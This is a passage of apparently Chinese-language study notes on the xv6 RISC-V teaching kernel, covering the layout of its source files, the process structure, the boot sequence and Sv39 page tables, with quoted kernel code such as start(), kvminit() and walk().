class="even"><td><strong>entry.S</strong></td><td>首次启动指令</td></tr><tr class="odd"><td><strong>exec.</strong></td><td><code>exec()</code>系统调用</td></tr><tr class="even"><td><strong>file.c</strong></td><td>文件描述符支持</td></tr><tr class="odd"><td><strong>fs.c</strong></td><td>文件系统</td></tr><tr class="even"><td><strong>kalloc.c</strong></td><td>物理页面分配器</td></tr><tr class="odd"><td><strong>kernelvec.S</strong></td><td>处理来自内核的陷入指令以及计时器中断</td></tr><tr class="even"><td><strong>log.c</strong></td><td>文件系统日志记录以及崩溃修复</td></tr><tr class="odd"><td><strong>main.c</strong></td><td>在启动过程中控制其他模块初始化</td></tr><tr class="even"><td><strong>pipe.c</strong></td><td>管道</td></tr><tr class="odd"><td><strong>plic.c</strong></td><td>RISC-V中断控制器</td></tr><tr class="even"><td><strong>printf.c</strong></td><td>格式化输出到控制台</td></tr><tr class="odd"><td><strong>proc.c</strong></td><td>进程和调度</td></tr><tr class="even"><td><strong>sleeplock.c</strong></td><td>Locks that yield the CPU</td></tr><tr class="odd"><td><strong>spinlock.c</strong></td><td>Locks that don’t yield the CPU.</td></tr><tr class="even"><td><strong>start.c</strong></td><td>早期机器模式启动代码</td></tr><tr class="odd"><td><strong>string.c</strong></td><td>字符串和字节数组库</td></tr><tr class="even"><td><strong>swtch.c</strong></td><td>线程切换</td></tr><tr class="odd"><td><strong>syscall.c</strong></td><td>Dispatch system calls to handling function.</td></tr><tr class="even"><td><strong>sysfile.c</strong></td><td>文件相关的系统调用</td></tr><tr class="odd"><td><strong>sysproc.c</strong></td><td>进程相关的系统调用</td></tr><tr class="even"><td><strong>trampoline.S</strong></td><td>用于在用户和内核之间切换的汇编代码</td></tr><tr class="odd"><td><strong>trap.c</strong></td><td>对陷入指令和中断进行处理并返回的C代码</td></tr><tr class="even"><td><strong>uart.c</strong></td><td>串口控制台设备驱动程序</td></tr><tr class="odd"><td><strong>virtio_disk.c</strong></td><td>磁盘设备驱动程序</td></tr><tr class="even"><td><strong>vm.c</strong></td><td>管理页表和地址空间</td></tr></tbody></table><h2 id="进程概述">2.2进程概述</h2><p>xv6 使用页表（由硬件实现）来为每个进程提供其独有的地址空间(实现隔离)。</p><p>页表将<em>虚拟地址</em>（x86 指令所使用的地址）翻译（或说“映射”）为<em>物理地址</em>（处理器芯片向主存发送的地址）。</p><p>Xv6为每个进程维护一个单独的页表，定义了该进程的地址空间。</p><p>RISC-V上的指针有64位宽；硬件在页表中查找虚拟地址时只使用低39位；xv6只使用这39位中的38位。因此，最大地址是2^38-1=0x3fffffffff，即<code>MAXVA</code>，在<strong>kernel/riscv.h</strong>中定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// one beyond the highest possible virtual address.</span></span><br><span class="line"><span class="comment">// MAXVA is actually one bit less than the max allowed by</span></span><br><span class="line"><span class="comment">// Sv39, to avoid having to sign-extend virtual addresses</span></span><br><span class="line"><span class="comment">// that have the high bit set.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVA (1L &lt;&lt; (9 + 9 + 9 + 12 - 1))</span></span><br></pre></td></tr></table></figure><p>xv6为<code>trampoline</code>（用于在用户和内核之间切换）和映射进程切换到内核的<code>trapframe</code>分别保留了一个页面:</p><p><img src="/2022/07/12/XV6/image-20220713121236349.png"></p><p>xv6内核为每个进程维护许多状态片段，并将它们聚集到一个<code>proc</code>结构体中<code>kernel/proc.h</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state,表明进程是已分配、就绪态、运行态、等待I/O中（阻塞态）还是退出</span></span><br><span class="line">  <span class="keyword">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="keyword">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="keyword">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="keyword">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait_lock must be held when using this:</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个进程都有一个执行线程（或简称线程）来执行进程的指令。一个线程可以挂起并且稍后再恢复</p><p>每个线程有两个栈区，一个user的stack，一个kernel的stack：<code>p-&gt;kstack</code></p><p>当进程执行用户指令时，只有它的用户栈在使用，它的内核栈是空的。当进程进入内核（由于系统调用或中断）时，内核代码在进程的内核堆栈上执行；当一个进程在内核中时，它的用户堆栈仍然包含保存的数据，只是不处于活动状态。进程的线程在主动使用它的用户栈和内核栈之间交替。内核栈是独立的（并且不受用户代码的保护），因此即使一个进程破坏了它的用户栈，内核依然可以正常运行。</p><p>一个进程可以通过执行RISC-V的<code>ecall</code>指令进行系统调用，该指令提升硬件特权级别，并将程序计数器（PC）更改为内核定义的入口点，，入口点的代码切换到内核栈，执行实现系统调用的内核指令，当系统调用完成时，内核切换回用户栈，并通过调用<code>sret</code>指令返回用户空间，该指令降低了硬件特权级别，并在系统调用指令刚结束时恢复执行用户指令。进程的线程可以在内核中“阻塞”等待I/O，并在I/O完成后恢复到中断的位置。</p><h2 id="启动xv6的第一个程序">2.3 启动XV6的第一个程序</h2><p>初始化自己并运行一个存储在只读内存中的引导加载程序。引导加载程序将xv6内核加载到内存中，之后在机器模式下CPU从<code>_entry</code>开始运行，动时页式硬件（paging hardware）处于禁用模式：也就是说虚拟地址将直接映射到物理地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">_entry:</span><br><span class="line"># set up a stack for C.</span><br><span class="line"># stack0 is declared in start.c,</span><br><span class="line"># with a 4096-byte stack per CPU.</span><br><span class="line"># sp = stack0 + (hartid * 4096)</span><br><span class="line">la sp, stack0</span><br><span class="line">li a0, 1024*4</span><br><span class="line">csrr a1, mhartid</span><br><span class="line">addi a1, a1, 1</span><br><span class="line">mul a0, a0, a1</span><br><span class="line">add sp, sp, a0</span><br><span class="line"># jump to start() in start.c</span><br><span class="line">call start</span><br></pre></td></tr></table></figure><p>设置好栈区之后调用start，<code>start</code>执行一些仅在机器模式下允许的配置，然后切换到管理模式(<code>mret</code>指令)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// set M Previous Privilege mode to Supervisor, for mret.</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> x = r_mstatus();</span><br><span class="line">x &amp;= ~MSTATUS_MPP_MASK;</span><br><span class="line">x |= MSTATUS_MPP_S;</span><br><span class="line">w_mstatus(x);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set M Exception Program Counter to main, for mret.</span></span><br><span class="line"><span class="comment">// requires gcc -mcmodel=medany</span></span><br><span class="line">w_mepc((uint64)main);</span><br><span class="line"></span><br><span class="line"><span class="comment">// disable paging for now.</span></span><br><span class="line">w_satp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// delegate all interrupts and exceptions to supervisor mode.</span></span><br><span class="line">w_medeleg(<span class="number">0xffff</span>);</span><br><span class="line">w_mideleg(<span class="number">0xffff</span>);</span><br><span class="line">w_sie(r_sie() | SIE_SEIE | SIE_STIE | SIE_SSIE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ask for clock interrupts.</span></span><br><span class="line">timerinit();</span><br><span class="line"></span><br><span class="line"><span class="comment">// keep each CPU&#x27;s hartid in its tp register, for cpuid().</span></span><br><span class="line"><span class="keyword">int</span> id = r_mhartid();</span><br><span class="line">w_tp(id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch to supervisor mode and jump to main().</span></span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;mret&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>mret</code>后会导致PC的值为main的地址<code>kernel/main.c</code></p><blockquote><p><strong>注：</strong><code>mret</code>执行返回，返回到先前状态，由于<code>start</code>函数将前模式改为了管理模式且返回地址改为了<code>main</code>,因此<code>mret</code>将返回到<code>main</code>函数，并以管理模式运行</p></blockquote><p><code>main</code>初始化几个设备和子系统后，调用<code>userinit</code>创建第一个进程（<code>kernel/proc.c</code>），第一个进程执行一个用RISC-V程序集写的小型程序：<strong>initcode. S</strong>，调用<code>exec</code>系统调用重新进入内核，<code>exec</code>使用用 <code>/init</code>（<strong>user/init.c</strong>）替换当前进程的内存和寄存器。一旦内核完成<code>exec</code>，它就返回<code>/init</code>进程中的用户空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Initial process that execs /init.</span><br><span class="line"># This code runs in user space.</span><br><span class="line"></span><br><span class="line">#include &quot;syscall.h&quot;</span><br><span class="line"></span><br><span class="line"># exec(init, argv)</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">        la a0, init</span><br><span class="line">        la a1, argv</span><br><span class="line">        li a7, SYS_exec</span><br><span class="line">        ecall</span><br><span class="line"></span><br><span class="line"># for(;;) exit();</span><br><span class="line">exit:</span><br><span class="line">        li a7, SYS_exit</span><br><span class="line">        ecall</span><br><span class="line">        jal exit</span><br><span class="line"></span><br><span class="line"># char init[] = &quot;/init\0&quot;;</span><br><span class="line">init:</span><br><span class="line">  .string &quot;/init\0&quot;</span><br><span class="line"></span><br><span class="line"># char *argv[] = &#123; init, 0 &#125;;</span><br><span class="line">.p2align 2</span><br><span class="line">argv:</span><br><span class="line">  .long init</span><br><span class="line">  .long 0</span><br></pre></td></tr></table></figure><p>之后的<code>/init</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//user.init.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid, wpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (open(<span class="string">&quot;console&quot;</span>, O_RDWR) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">mknod(<span class="string">&quot;console&quot;</span>, CONSOLE, <span class="number">0</span>);</span><br><span class="line">open(<span class="string">&quot;console&quot;</span>, O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line">dup(<span class="number">0</span>); <span class="comment">// stdout</span></span><br><span class="line">dup(<span class="number">0</span>); <span class="comment">// stderr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: starting sh\n&quot;</span>);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: fork failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: exec sh failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// this call to wait() returns if the shell exits,</span></span><br><span class="line"><span class="comment">// or if a parentless process exits.</span></span><br><span class="line">wpid = wait((<span class="keyword">int</span> *)<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (wpid == pid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// the shell exited; restart it.</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (wpid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: wait returned an error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// it was a parentless process; do nothing.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="chapter-3page-tables">Chapter 3:Page tables</h1><p>页表是操作系统为每个进程提供自己的私有地址空间和内存的机制。页表决定了内存地址的含义，以及物理内存的哪些部分可以访问。</p><h2 id="分页硬件">3.1 分页硬件</h2><p>XV6基于Sv39 RISC-V运行，只使用64位虚拟地址的低39位；而<strong>高25位不使用</strong>。在这种Sv39配置中，RISC-V页表在逻辑上是一个由<span class="math inline">\(2^{27}\)</span>（134,217,728）个<strong>页表条目（Page Table Entries/PTE）</strong>组成的数组。每个PTE包含一个44位的<strong>物理页码（Physical Page Number/PPN）</strong>和一些标志。页式硬件通过使用虚拟地址39位中的前27位索引页表，以找到该虚拟地址对应的一个PTE，然后生成一个56位的物理地址，其前44位来自PTE中的PPN，其后12位来自原始虚拟地址。如下图3.1，页表的逻辑视图是一个简单的PTE数组如图3.2。页表通过逻辑到物理地址的转换给了操作系统控制权，转换的粒度是一个个对齐的物理块（一个物理块包含<span class="math inline">\(2^{12}=4096\)</span>字节），这样的块称为页。</p><p><img src="/2022/07/12/XV6/p1.png"></p><p><img src="/2022/07/12/XV6/p2.png"></p><p>如果转换地址所需的三个PTE中的任何一个不存在，页式硬件就会引发页面故障异常，并让内核来处理该异常</p><p>每个<code>PTE</code>包含的标志位（在<code>kernel/riscv.h</code>中定义）：</p><ul><li><code>PTE_V</code>指示PTE是否存在：如果它没有被设置，对页面的引用会导致异常（即不允许）。</li><li><code>PTE_R</code>控制是否允许指令读取到页面。</li><li><code>PTE_W</code>控制是否允许指令写入到页面。</li><li><code>PTE_X</code>控制CPU是否可以将页面内容解释为指令并执行它们。</li><li><code>PTE_U</code>控制用户模式下的指令是否被允许访问页面；如果没有设置<code>PTE_U</code>，PTE只能在管理模式下使用。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGSIZE 4096 <span class="comment">// bytes per page</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGSHIFT 12  <span class="comment">// bits of offset within a page</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGROUNDUP(sz)  (((sz)+PGSIZE-1) &amp; ~(PGSIZE-1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE-1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="comment">// valid</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_R (1L &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_W (1L &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_X (1L &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_U (1L <span class="meta-string">&lt;&lt; 4) // 1 -&gt;</span> user can access</span></span><br></pre></td></tr></table></figure><p>为了告诉硬件使用页表，内核必须将根页表页的物理地址写入到<code>satp</code>寄存器中（<code>satp</code>的作用是存放根页表页在物理内存中的地址）。每个CPU都有自己的<code>satp</code>。一个CPU将使用自己的<code>satp</code>指向的页表转换后续指令生成的所有地址。每个CPU都有自己的<code>satp</code>，这样不同的CPU就可以运行不同的进程，每个CPU都有自己的页表描述的私有地址空间。</p><p>物理内存以一个字节为单位划为地址，称为物理地址。</p><h2 id="内核地址空间">3.2 内核地址空间</h2><p><strong>kernel/memlayout.h</strong>声明了xv6内核内存布局的常量，内存映射：</p><p><img src="/2022/07/12/XV6/p3.png" alt="img" style="zoom: 80%;"></p><p>QEMU模拟了一台计算机，它包括从物理地址<code>0x80000000</code>开始，到<code>0x86400000</code>结束的RAM（物理内存），<code>KERNBASE</code>和<code>PHYSTOP</code>；QEMU还模拟了IO等设备。</p><p>有几个内核虚拟地址不是直接映射：</p><ul><li><code>trampoline page</code>。映射在虚拟地址空间的顶部；用户页表具有相同的映射。</li><li>内核栈页面。每个进程都有自己的内核栈，它将映射到偏高一些的地址，这样xv6在它之下就可以留下一个未映射的保护页(<strong>guard page)</strong>。保护页的PTE是无效的（也就是说<code>PTE_V</code>没有设置），所以如果内核溢出内核栈就会引发一个异常，内核触发<code>panic</code>。如果没有保护页，栈溢出将会覆盖其他内核内存，引发错误操作。（注：Guard page不会浪费物理内存，它只是占据了虚拟地址空间的一段靠后的地址，但并<strong>不映射到物理地址空间</strong>。）</li></ul><h2 id="建立一个地址空间">3.3 建立一个地址空间</h2><p>大多数用于操作地址空间和页表的xv6代码都写在<strong>kernel/vm.c</strong>中，核心数据结构是<code>pagetable_t</code>(uint64)，一个<code>pagetable_t</code>可以是内核页表，也可以是一个进程页表。</p><p>最核心的函数是<code>walk</code>和<code>mappages</code>，前者为虚拟地址找到PTE，后者为新映射装载PTE。名称以<code>kvm</code>开头的函数操作内核页表；以<code>uvm</code>开头的函数操作用户页表；其他函数用于二者。<code>copyout</code>和<code>copyin</code>复制数据到用户虚拟地址或从用户虚拟地址复制数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">kernel_pagetable = (<span class="keyword">pagetable_t</span>)kalloc();</span><br><span class="line"><span class="built_in">memset</span>(kernel_pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// uart registers</span></span><br><span class="line">kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// virtio mmio disk interface</span></span><br><span class="line">kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CLINT</span></span><br><span class="line">kvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PLIC</span></span><br><span class="line">kvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">kvmmap(KERNBASE, KERNBASE, (uint64)etext - KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">kvmmap((uint64)etext, (uint64)etext, PHYSTOP - (uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line"><span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最开始<code>main</code>调用<code>kvninit</code> 来创建内核的页表。这个调用发生在xv6使能RISC-V分页之前，所以地址直接引用物理内存。</p><p>首先分配一个物理页保存根页表页，之后调用<code>kvmmap</code>装载内核需要的转换，</p><p><code>kvmmap</code>：调用<code>mappages</code>，<code>mappages</code>将范围虚拟地址到同等范围物理地址的映射装载到一个页表中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add a mapping to the kernel page table.</span></span><br><span class="line"><span class="comment">// only used when booting.</span></span><br><span class="line"><span class="comment">// does not flush TLB or enable paging.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>walk</code>：为虚拟地址找到PTE，模仿RISC-V分页硬件。每次从三级页表中读9位，使用上一级的9位虚拟地址来查找下一级页表或最终页面的PTE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return the address of the PTE in page table pagetable</span></span><br><span class="line"><span class="comment">// that corresponds to virtual address va.  If alloc!=0,</span></span><br><span class="line"><span class="comment">// create any required page-table pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The risc-v Sv39 scheme has three levels of page-table</span></span><br><span class="line"><span class="comment">// pages. A page-table page contains 512 64-bit PTEs.</span></span><br><span class="line"><span class="comment">// A 64-bit virtual address is split into five fields:</span></span><br><span class="line"><span class="comment">//   39..63 -- must be zero.</span></span><br><span class="line"><span class="comment">//   30..38 -- 9 bits of level-2 index.</span></span><br><span class="line"><span class="comment">//   21..29 -- 9 bits of level-1 index.</span></span><br><span class="line"><span class="comment">//   12..20 -- 9 bits of level-0 index.</span></span><br><span class="line"><span class="comment">//    0..11 -- 12 bits of byte offset within the page.</span></span><br><span class="line"><span class="function"><span class="keyword">pte_t</span> *<span class="title">walk</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, <span class="keyword">int</span> alloc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (va &gt;= MAXVA)</span><br><span class="line">panic(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">2</span>; level &gt; <span class="number">0</span>; level--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pte_t</span> *pte = &amp;pagetable[PX(level, va)];</span><br><span class="line"><span class="keyword">if</span> (*pte &amp; PTE_V)</span><br><span class="line">&#123;</span><br><span class="line">pagetable = (<span class="keyword">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!alloc || (pagetable = (<span class="keyword">pde_t</span> *)kalloc()) == <span 